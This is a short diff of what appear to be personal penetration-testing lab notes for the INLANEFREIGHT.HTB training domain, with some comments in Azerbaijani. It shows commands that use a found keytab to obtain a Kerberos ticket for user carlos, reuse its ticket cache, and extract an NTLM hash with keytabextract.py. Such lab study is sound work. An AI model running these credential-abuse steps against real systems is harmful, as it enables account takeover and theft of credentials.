@@ -38,7 +38,7 @@ KVNO Timestamp           Principal
    1 01/20/2026 17:25:01 carlos@INLANEFREIGHT.HTB
    1 01/20/2026 17:25:01 carlos@INLANEFREIGHT.HTB
 
-kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab ( Credential Material write to CCACHE )
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab ( Credential Material write to CCACHE. Write Keytab in TGT )
 klist:
 Ticket cache: FILE:/tmp/krb5cc_647401107_FzYTA8
 Default principal: carlos@INLANEFREIGHT.HTB
@@ -52,8 +52,6 @@ Valid starting       Expires              Service principal
 
 echo $KRB5CCNAME ( Check CCACHE )
 export KRB5CCNAME=/tmp/krb5cc_647401107_FzYTA8 ( Əgər yoxdursa daxil etmək )
-
-kinit -kt /opt/specialfiles/carlos.keytab carlos@INLANEFREIGHT.HTB ( Keytab ilə TGT almaq )
 
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
